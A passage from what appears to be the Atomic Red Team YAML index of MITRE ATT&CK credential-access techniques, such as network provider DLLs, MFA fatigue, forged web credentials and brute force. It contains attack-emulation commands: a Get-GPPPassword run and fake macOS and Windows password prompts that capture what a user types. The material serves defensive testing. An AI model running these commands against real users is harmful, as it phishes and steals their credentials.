        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
          {exit 0} else {exit 1}

          '
        get_prereq_command: 'Write-Host Joining this computer to a domain must be
          done manually

          '
      executor:
        command: |
          . #{gpp_script_path}
          Get-GPPPassword -Verbose
        name: powershell
  T1556.008:
    technique:
      modified: '2023-05-04T18:02:51.318Z'
      name: Network Provider DLL
      description: "Adversaries may register malicious network provider dynamic link
        libraries (DLLs) to capture cleartext user credentials during the authentication
        process. Network provider DLLs allow Windows to interface with specific network
        protocols and can also support add-on credential management functions.(Citation:
        Network Provider API) During the logon process, Winlogon (the interactive
        logon module) sends credentials to the local `mpnotify.exe` process via RPC.
        The `mpnotify.exe` process then shares the credentials in cleartext with registered
        credential managers when notifying that a logon event is happening.(Citation:
        NPPSPY - Huntress)(Citation: NPPSPY Video)(Citation: NPLogonNotify) \n\nAdversaries
        can configure a malicious network provider DLL to receive credentials from
        `mpnotify.exe`.(Citation: NPPSPY) Once installed as a credential manager (via
        the Registry), a malicious DLL can receive and save credentials each time
        a user logs onto a Windows workstation or domain via the `NPLogonNotify()`
        function.(Citation: NPLogonNotify)\n\nAdversaries may target planting malicious
        network provider DLLs on systems known to have increased logon activity and/or
        administrator logon activity, such as servers and domain controllers.(Citation:
        NPPSPY - Huntress)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: persistence
      x_mitre_contributors:
      - CrowdStrike Falcon OverWatch
      - Jai Minton
      x_mitre_deprecated: false
      x_mitre_detection: ''
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Windows
      x_mitre_version: '1.0'
      x_mitre_data_sources:
      - 'Windows Registry: Windows Registry Key Modification'
      - 'File: File Creation'
      - 'Process: OS API Execution'
      - 'Windows Registry: Windows Registry Key Creation'
      type: attack-pattern
      id: attack-pattern--90c4a591-d02d-490b-92aa-619d9701ac04
      created: '2023-03-30T22:45:00.431Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1556/008
        external_id: T1556.008
      - source_name: NPPSPY - Huntress
        description: " Dray Agha. (2022, August 16). Cleartext Shenanigans: Gifting
          User Passwords to Adversaries With NPPSPY. Retrieved March 30, 2023."
        url: https://www.huntress.com/blog/cleartext-shenanigans-gifting-user-passwords-to-adversaries-with-nppspy
      - source_name: NPPSPY Video
        description: Grzegorz Tworek. (2021, December 14). How winlogon.exe shares
          the cleartext password with custom DLLs. Retrieved March 30, 2023.
        url: https://www.youtube.com/watch?v=ggY3srD9dYs
      - source_name: NPPSPY
        description: Grzegorz Tworek. (2021, December 15). NPPSpy. Retrieved March
          30, 2023.
        url: https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy
      - source_name: Network Provider API
        description: Microsoft. (2021, January 7). Network Provider API. Retrieved
          March 30, 2023.
        url: https://learn.microsoft.com/en-us/windows/win32/secauthn/network-provider-api
      - source_name: NPLogonNotify
        description: Microsoft. (2021, October 21). NPLogonNotify function (npapi.h).
          Retrieved March 30, 2023.
        url: https://learn.microsoft.com/en-us/windows/win32/api/npapi/nf-npapi-nplogonnotify
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1141:
    technique:
      x_mitre_platforms:
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Matthew Molyett, @s1air, Cisco Talos
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--91ce1ede-107f-4d8b-bf4c-735e8789c94b
      type: attack-pattern
      created: '2017-12-14T16:46:06.044Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1141
        url: https://attack.mitre.org/techniques/T1141
      - external_id: CAPEC-569
        source_name: capec
        url: https://capec.mitre.org/data/definitions/569.html
      - url: https://baesystemsai.blogspot.com/2015/06/new-mac-os-malware-exploits-mackeeper.html
        description: Sergei Shevchenko. (2015, June 4). New Mac OS Malware Exploits
          Mackeeper. Retrieved July 3, 2017.
        source_name: OSX Malware Exploits MacKeeper
      - source_name: LogRhythm Do You Trust Oct 2014
        url: https://logrhythm.com/blog/do-you-trust-your-computer/
        description: Foss, G. (2014, October 3). Do You Trust Your Computer?. Retrieved
          December 17, 2018.
      - url: https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/
        description: Marc-Etienne M.Leveille. (2016, July 6). New OSX/Keydnap malware
          is hungry for credentials. Retrieved July 3, 2017.
        source_name: OSX Keydnap malware
      - source_name: Enigma Phishing for Credentials Jan 2015
        url: https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/
        description: 'Nelson, M. (2015, January 21). Phishing for Credentials: If
          you want it, just ask!. Retrieved December 17, 2018.'
      modified: '2020-02-12T16:34:06.412Z'
      name: Input Prompt
      description: |-
        When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1088)).

        Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1155)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware) and [PowerShell](https://attack.mitre.org/techniques/T1086)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015).
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: |-
        Monitor process execution for unusual programs as well as malicious instances of [Scripting](https://attack.mitre.org/techniques/T1064) that could be used to prompt users for credentials.

        Inspect and scrutinize input prompts for indicators of illegitimacy, such as non-traditional banners, text, timing, and/or sources.
      x_mitre_version: '2.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - User
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1606:
    technique:
      modified: '2023-05-04T18:05:16.877Z'
      name: Forge Web Credentials
      description: "Adversaries may forge credential materials that can be used to
        gain access to web applications or Internet services. Web applications and
        services (hosted in cloud SaaS environments or on-premise servers) often use
        session cookies, tokens, or other materials to authenticate and authorize
        user access.\n\nAdversaries may generate these credential materials in order
        to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539),
        [Steal Application Access Token](https://attack.mitre.org/techniques/T1528),
        and other similar behaviors in that the credentials are new and forged by
        the adversary, rather than stolen or intercepted from legitimate users. The
        generation of web credentials often requires secret values, such as passwords,
        [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic
        seed values.(Citation: GitHub AWS-ADFS-Credential-Generator) Adversaries may
        also forge tokens by taking advantage of features such as the `AssumeRole`
        and `GetFederationToken` APIs in AWS, which allow users to request temporary
        security credentials.(Citation: AWS Temporary Security Credentials)\n\nOnce
        forged, adversaries may use these web credentials to access resources (ex:
        [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550)),
        which may bypass multi-factor and other authentication protection mechanisms.(Citation:
        Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)(Citation:
        Microsoft SolarWinds Customer Guidance)  "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_contributors:
      - Dylan Silva, AWS Security
      x_mitre_deprecated: false
      x_mitre_detection: Monitor for anomalous authentication activity, such as logons
        or other user session activity associated with unknown accounts. Monitor for
        unexpected and abnormal access to resources, including access of websites
        and cloud-based applications by the same user in different locations or by
        different systems that do not match expected configurations.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - SaaS
      - Windows
      - macOS
      - Linux
      - Azure AD
      - Office 365
      - Google Workspace
      - IaaS
      x_mitre_version: '1.3'
      x_mitre_data_sources:
      - 'Web Credential: Web Credential Usage'
      - 'Logon Session: Logon Session Creation'
      - 'Web Credential: Web Credential Creation'
      type: attack-pattern
      id: attack-pattern--94cb00a4-b295-4d06-aa2b-5653b9c1be9c
      created: '2020-12-17T02:13:46.247Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1606
        external_id: T1606
      - source_name: AWS Temporary Security Credentials
        description: AWS. (n.d.). Requesting temporary security credentials. Retrieved
          April 1, 2022.
        url: https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_request.html
      - source_name: Unit 42 Mac Crypto Cookies January 2019
        description: Chen, Y., Hu, W., Xu, Z., et. al. (2019, January 31). Mac Malware
          Steals Cryptocurrency Exchanges‚Äô Cookies. Retrieved October 14, 2019.
        url: https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/
      - source_name: GitHub AWS-ADFS-Credential-Generator
        description: Damian Hickey. (2017, January 28). AWS-ADFS-Credential-Generator.
          Retrieved December 16, 2020.
        url: https://github.com/damianh/aws-adfs-credential-generator
      - source_name: Microsoft SolarWinds Customer Guidance
        description: MSRC. (2020, December 13). Customer Guidance on Recent Nation-State
          Cyber Attacks. Retrieved December 17, 2020.
        url: https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/
      - source_name: Pass The Cookie
        description: Rehberger, J. (2018, December). Pivot to the Cloud using Pass
          the Cookie. Retrieved April 5, 2019.
        url: https://wunderwuzzi23.github.io/blog/passthecookie.html
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1621:
    technique:
      modified: '2023-04-04T03:06:34.448Z'
      name: Multi-Factor Authentication Request Generation
      description: |-
        Adversaries may attempt to bypass multi-factor authentication (MFA) mechanisms and gain access to accounts by generating MFA requests sent to users.

        Adversaries in possession of credentials to [Valid Accounts](https://attack.mitre.org/techniques/T1078) may be unable to complete the login process if they lack access to the 2FA or MFA mechanisms required as an additional credential and security control. To circumvent this, adversaries may abuse the automatic generation of push notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta, or similar services to have the user grant access to their account.

        In some cases, adversaries may continuously repeat login attempts in order to bombard users with MFA push notifications, SMS messages, and phone calls, potentially resulting in the user finally accepting the authentication request in response to ‚ÄúMFA fatigue.‚Ä?(Citation: Russian 2FA Push Annoyance - Cimpanu)(Citation: MFA Fatigue Attacks - PortSwigger)(Citation: Suspected Russian Activity Targeting Government and Business Entities Around the Globe)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_contributors:
      - Jon Sternstein, Stern Security
      - Pawel Partyka, Microsoft 365 Defender
      - Shanief Webb
      x_mitre_deprecated: false
      x_mitre_detection: 'Monitor user account logs as well as 2FA/MFA application
        logs for suspicious events: unusual login attempt source location, mismatch
        in location of login attempt and smart device receiving 2FA/MFA request prompts,
        and high volume of repeated login attempts, all of which may indicate user''s
        primary credentials have been compromised minus 2FA/MFA mechanism. '
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Windows
      - Office 365
      - Linux
      - macOS
      - IaaS
      - SaaS
      - Azure AD
      - Google Workspace
      x_mitre_version: '1.0'
      x_mitre_data_sources:
      - 'Application Log: Application Log Content'
      - 'Logon Session: Logon Session Creation'
      - 'Logon Session: Logon Session Metadata'
      - 'User Account: User Account Authentication'
      type: attack-pattern
      id: attack-pattern--954a1639-f2d6-407d-aef3-4917622ca493
      created: '2022-04-01T02:15:49.754Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1621
        external_id: T1621
      - source_name: Russian 2FA Push Annoyance - Cimpanu
        description: Catalin Cimpanu. (2021, December 9). Russian hackers bypass 2FA
          by annoying victims with repeated push notifications. Retrieved March 31,
          2022.
        url: https://therecord.media/russian-hackers-bypass-2fa-by-annoying-victims-with-repeated-push-notifications/
      - source_name: MFA Fatigue Attacks - PortSwigger
        description: 'Jessica Haworth. (2022, February 16). MFA fatigue attacks: Users
          tricked into allowing device access due to overload of push notifications.
          Retrieved March 31, 2022.'
        url: https://portswigger.net/daily-swig/mfa-fatigue-attacks-users-tricked-into-allowing-device-access-due-to-overload-of-push-notifications
      - source_name: Suspected Russian Activity Targeting Government and Business
          Entities Around the Globe
        description: Luke Jenkins, Sarah Hawley, Parnian Najafi, Doug Bienstock. (2021,
          December 6). Suspected Russian Activity Targeting Government and Business
          Entities Around the Globe. Retrieved April 15, 2022.
        url: https://www.mandiant.com/resources/russian-targeting-gov-business
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1552.008:
    technique:
      modified: '2023-04-11T00:34:00.779Z'
      name: Chat Messages
      description: |-
        Adversaries may directly collect unsecured credentials stored or passed through user communication services. Credentials may be sent and stored in user chat communication applications such as email, chat services like Slack or Teams, collaboration tools like Jira or Trello, and any other services that support user communication. Users may share various forms of credentials (such as usernames and passwords, API keys, or authentication tokens) on private or public corporate internal communications channels.

        Rather than accessing the stored chat logs (i.e., [Credentials In Files](https://attack.mitre.org/techniques/T1552/001)), adversaries may directly access credentials within these services on the user endpoint, through servers hosting the services, or through administrator portals for cloud hosted services. Adversaries may also compromise integration tools like Slack Workflows to automatically search through messages to extract user credentials. These credentials may then be abused to perform follow-on activities such as lateral movement or privilege escalation (Citation: Slack Security Risks).
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_contributors:
      - Douglas Weir
      x_mitre_deprecated: false
      x_mitre_detection: ''
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Office 365
      - SaaS
      - Google Workspace
      x_mitre_version: '1.0'
      x_mitre_data_sources:
      - 'Application Log: Application Log Content'
      type: attack-pattern
      id: attack-pattern--9664ad0e-789e-40ac-82e2-d7b17fbe8fb3
      created: '2023-03-14T14:38:03.673Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1552/008
        external_id: T1552.008
      - source_name: Slack Security Risks
        description: Michael Osakwe. (2020, November 18). 4 SaaS and Slack Security
          Risks to Consider. Retrieved March 17, 2023.
        url: https://www.nightfall.ai/blog/saas-slack-security-risks-2020
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1212:
    technique:
      x_mitre_platforms:
      - Linux
      - Windows
      - macOS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - John Lambert, Microsoft Threat Intelligence Center
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36
      created: '2018-04-18T17:59:24.739Z'
      x_mitre_version: '1.4'
      external_references:
      - source_name: mitre-attack
        external_id: T1212
        url: https://attack.mitre.org/techniques/T1212
      - source_name: ADSecurity Detecting Forged Tickets
        url: https://adsecurity.org/?p=1515
        description: Metcalf, S. (2015, May 03). Detecting Forged Kerberos Ticket
          (Golden Ticket & Silver Ticket) Use in Active Directory. Retrieved December
          23, 2015.
      - source_name: Technet MS14-068
        url: https://technet.microsoft.com/en-us/library/security/ms14-068.aspx
        description: Microsoft. (2014, November 18). Vulnerability in Kerberos Could
          Allow Elevation of Privilege (3011780). Retrieved December 23, 2015.
      x_mitre_deprecated: false
      revoked: false
      description: 'Adversaries may exploit software vulnerabilities in an attempt
        to collect credentials. Exploitation of a software vulnerability occurs when
        an adversary takes advantage of a programming error in a program, service,
        or within the operating system software or kernel itself to execute adversary-controlled
        code.¬†Credentialing and authentication mechanisms may be targeted for exploitation
        by adversaries as a means to gain access to useful credentials or circumvent
        the process to gain access to systems. One example of this is MS14-068, which
        targets Kerberos and can be used to forge Kerberos tickets using domain user
        permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged
        Tickets) Exploitation for credential access may also result in Privilege Escalation
        depending on the process targeted or credentials obtained.'
      modified: '2022-04-28T16:06:49.447Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: Exploitation for Credential Access
      x_mitre_detection: Detecting software exploitation may be difficult depending
        on the tools available. Software exploits may not always succeed or may cause
        the exploited process to become unstable or crash. Also look for behavior
        on the system that might indicate successful compromise, such as abnormal
        behavior of processes. Credential resources obtained through exploitation
        may be detectable in use if they are not normally used or seen.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_is_subtechnique: false
      x_mitre_data_sources:
      - 'Application Log: Application Log Content'
      - 'Process: Process Creation'
      - 'User Account: User Account Authentication'
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1142:
    technique:
      x_mitre_platforms:
      - macOS
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--9e09ddb2-1746-4448-9cad-7f8b41777d6d
      type: attack-pattern
      created: '2017-12-14T16:46:06.044Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1142
        url: https://attack.mitre.org/techniques/T1142
      - url: https://en.wikipedia.org/wiki/Keychain_(software)
        description: Wikipedia. (n.d.). Keychain (software). Retrieved July 5, 2017.
        source_name: Wikipedia keychain
      - url: http://www.slideshare.net/StephanBorosh/external-to-da-the-os-x-way
        description: Alex Rymdeko-Harvey, Steve Borosh. (2016, May 14). External to
          DA, the OS X Way. Retrieved July 3, 2017.
        source_name: External to DA, the OS X Way
      modified: '2020-02-12T18:55:55.305Z'
      name: Keychain
      description: |-
        Keychains are the built-in way for macOS to keep track of users' passwords and credentials for many services and features such as WiFi passwords, websites, secure notes, certificates, and Kerberos. Keychain files are located in <code>~/Library/Keychains/</code>,<code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>. (Citation: Wikipedia keychain) The <code>security</code> command-line utility, which is built into macOS by default, provides a useful way to manage these credentials.

        To manage their credentials, users have to use additional credentials to access their keychain. If an adversary knows the credentials for the login keychain, then they can get access to all the other credentials stored in this vault. (Citation: External to DA, the OS X Way) By default, the passphrase for the keychain is the user‚Äôs logon credentials.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: Unlocking the keychain and using passwords from it is a very
        common process, so there is likely to be a lot of noise in any detection technique.
        Monitoring of system calls to the keychain can help determine if there is
        a suspicious process trying to access it.
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - Administrator
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1056.002:
    technique:
      modified: '2023-03-30T21:01:48.279Z'
      name: 'Input Capture: GUI Input Capture'
      description: "Adversaries may mimic common operating system GUI components to
        prompt users for credentials with a seemingly legitimate prompt. When programs
        are executed that need additional privileges than are present in the current
        user context, it is common for the operating system to prompt the user for
        proper credentials to authorize the elevated privileges for the task (ex:
        [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).\n\nAdversaries
        may mimic this functionality to prompt users for credentials with a seemingly
        legitimate prompt for a number of reasons that mimic normal usage, such as
        a fake installer requiring additional access or a fake malware removal suite.(Citation:
        OSX Malware Exploits MacKeeper) This type of prompt can be used to collect
        credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation:
        LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation:
        Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation:
        LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials
        Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries
        may launch dialog boxes prompting users for credentials from malicious shell
        scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation:
        Spoofing credential dialogs) "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_contributors:
      - Matthew Molyett, @s1air, Cisco Talos
      x_mitre_detection: "Monitor process execution for unusual programs as well as
        malicious instances of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)
        that could be used to prompt users for credentials. For example, command/script
        history including abnormal parameters (such as requests for credentials and/or
        strings related to creating password prompts) may be malicious.(Citation:
        Spoofing credential dialogs) \n\nInspect and scrutinize input prompts for
        indicators of illegitimacy, such as non-traditional banners, text, timing,
        and/or sources. "
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - macOS
      - Windows
      - Linux
      x_mitre_version: '1.2'
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Script: Script Execution'
      - 'Process: Process Creation'
      x_mitre_permissions_required:
      - User
      type: attack-pattern
      id: attack-pattern--a2029942-0a85-4947-b23c-ca434698171d
      created: '2020-02-11T18:58:45.908Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1056/002
        external_id: T1056.002
      - source_name: OSX Malware Exploits MacKeeper
        description: Sergei Shevchenko. (2015, June 4). New Mac OS Malware Exploits
          Mackeeper. Retrieved July 3, 2017.
        url: https://baesystemsai.blogspot.com/2015/06/new-mac-os-malware-exploits-mackeeper.html
      - source_name: LogRhythm Do You Trust Oct 2014
        description: Foss, G. (2014, October 3). Do You Trust Your Computer?. Retrieved
          December 17, 2018.
        url: https://logrhythm.com/blog/do-you-trust-your-computer/
      - source_name: OSX Keydnap malware
        description: Marc-Etienne M.Leveille. (2016, July 6). New OSX/Keydnap malware
          is hungry for credentials. Retrieved July 3, 2017.
        url: https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/
      - source_name: Spoofing credential dialogs
        description: Johann Rehberger. (2021, April 18). Spoofing credential dialogs
          on macOS Linux and Windows. Retrieved August 19, 2021.
        url: https://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/
      - source_name: Enigma Phishing for Credentials Jan 2015
        description: 'Nelson, M. (2015, January 21). Phishing for Credentials: If
          you want it, just ask!. Retrieved December 17, 2018.'
        url: https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      identifier: T1056.002
    atomic_tests:
    - name: AppleScript - Prompt User for Password
      auto_generated_guid: 76628574-0bc1-4646-8fe2-8f4427b47d15
      description: |
        Prompt User for Password (Local Phishing)
        Reference: http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html
      supported_platforms:
      - macos
      executor:
        command: 'osascript -e ''tell app "System Preferences" to activate'' -e ''tell
          app "System Preferences" to activate'' -e ''tell app "System Preferences"
          to display dialog "Software Update requires that you type your password
          to apply changes." & return & return  default answer "" with icon 1 with
          hidden answer with title "Software Update"''

          '
        name: bash
    - name: PowerShell - Prompt User for Password
      auto_generated_guid: 2b162bfd-0928-4d4c-9ec3-4d9f88374b52
      description: |
        Prompt User for Password (Local Phishing) as seen in Stitch RAT. Upon execution, a window will appear for the user to enter their credentials.

        Reference: https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py
      supported_platforms:
      - windows
      executor:
        command: "# Creates GUI to prompt for password. Expect long pause before prompt
          is available.    \n$cred = $host.UI.PromptForCredential('Windows Security
          Update', '',[Environment]::UserName, [Environment]::UserDomainName)\n# Using
          write-warning to allow message to show on console as echo and other similar
          commands are not visable from the Invoke-AtomicTest framework.\nwrite-warning
          $cred.GetNetworkCredential().Password\n"
        name: powershell
  T1110:
    technique:
      modified: '2023-04-14T23:03:34.362Z'
      name: Brute Force
      description: |-
        Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.

        Brute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [Account Discovery](https://attack.mitre.org/techniques/T1087), or [Password Policy Discovery](https://attack.mitre.org/techniques/T1201). Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services](https://attack.mitre.org/techniques/T1133) as part of Initial Access.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_contributors:
      - David Fiser, @anu4is, Trend Micro
      - Alfredo Oliveira, Trend Micro
      - Magno Logan, @magnologan, Trend Micro
      - Yossi Weizman, Azure Defender Research Team
      - Ed Williams, Trustwave, SpiderLabs
      - Mohamed Kmal
      x_mitre_deprecated: false
      x_mitre_detection: Monitor authentication logs for system and application login
        failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If
        authentication failures are high, then there may be a brute force attempt
        to gain access to a system using legitimate credentials. Also monitor for
        many failed authentication attempts across various accounts that may result
        from password spraying attempts. It is difficult to detect when hashes are
        cracked, since this is generally done outside the scope of the target network.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Windows
      - Azure AD
      - Office 365
      - SaaS
      - IaaS
      - Linux
      - macOS
      - Google Workspace
      - Containers
      - Network
      x_mitre_version: '2.5'
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Application Log: Application Log Content'
      - 'User Account: User Account Authentication'
      type: attack-pattern
      id: attack-pattern--a93494bb-4b80-4ea1-8695-3236a49916fd
      created: '2017-05-31T21:31:22.767Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1110
        external_id: T1110
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1110.004:
    technique:
      modified: '2023-04-14T23:05:16.857Z'
      name: 'Brute Force: Credential Stuffing'
      description: |-
        Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.

        Credential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.

        Typically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:

        * SSH (22/TCP)
        * Telnet (23/TCP)
        * FTP (21/TCP)
        * NetBIOS / SMB / Samba (139/TCP & 445/TCP)
        * LDAP (389/TCP)
        * Kerberos (88/TCP)
        * RDP / Terminal Services (3389/TCP)
        * HTTP/HTTP Management Services (80/TCP & 443/TCP)
        * MSSQL (1433/TCP)
        * Oracle (1521/TCP)
        * MySQL (3306/TCP)
        * VNC (5900/TCP)

        In addition to management services, adversaries may "target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols," as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_contributors:
      - Diogo Fernandes
      - Anastasios Pingios
      x_mitre_deprecated: false
      x_mitre_detection: Monitor authentication logs for system and application login
        failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If
        authentication failures are high, then there may be a brute force attempt
        to gain access to a system using legitimate credentials.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Windows
      - Azure AD
      - Office 365
      - SaaS
      - IaaS
      - Linux
      - macOS
      - Google Workspace
      - Containers
      x_mitre_version: '1.3'
      x_mitre_data_sources:
      - 'User Account: User Account Authentication'
      - 'Application Log: Application Log Content'
      type: attack-pattern
      id: attack-pattern--b2d03cea-aec1-45ca-9744-9ee583c1e1cc
